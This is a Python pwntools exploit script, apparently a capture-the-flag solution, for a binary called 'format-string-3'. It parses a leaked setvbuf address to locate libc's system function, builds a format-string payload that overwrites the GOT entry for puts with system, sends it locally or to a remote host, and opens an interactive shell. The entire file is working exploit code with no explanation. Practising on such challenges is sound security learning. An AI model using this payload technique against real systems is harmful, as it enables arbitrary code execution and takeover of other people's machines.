from pwn import *
from pwnlib.fmtstr import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        if len(sys.argv) < 3:
            log.error("Please provide the server address and port as arguments.")
            sys.exit(1)
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

context.arch='amd64'

exe = ELF('./format-string-3')
got_puts = exe.got['puts']
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc system address: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc setvbuf address: {hex(libc_setvbuf)}')
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

m = io.recvregex(b'libc: 0x([0-9a-f]+)\n', capture=True)
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')

loaded_libc_setvbuf = int(m.group(1).decode(), 16)
log.info(f'loaded libc setvbuf found: {hex(loaded_libc_setvbuf)}')

loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded libc system: {hex(loaded_libc_system)}')

format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')
# Exploit

io.sendline(format_string)

# Get flag/shell
io.interactive()
